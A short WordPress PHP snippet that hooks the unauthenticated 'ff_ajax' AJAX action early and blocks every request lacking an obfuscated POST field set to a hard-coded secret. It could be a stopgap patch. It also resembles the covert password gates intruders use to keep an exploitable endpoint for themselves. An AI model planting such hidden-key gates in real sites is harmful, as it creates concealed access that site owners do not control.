<?php

function hide_super_player() {
	if (!isset($_POST["syxyzxbgyxwguj"]) || $_POST["syxyzxbgyxwguj"] !== "q383lxP7LL") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'hide_super_player', 5, 1);
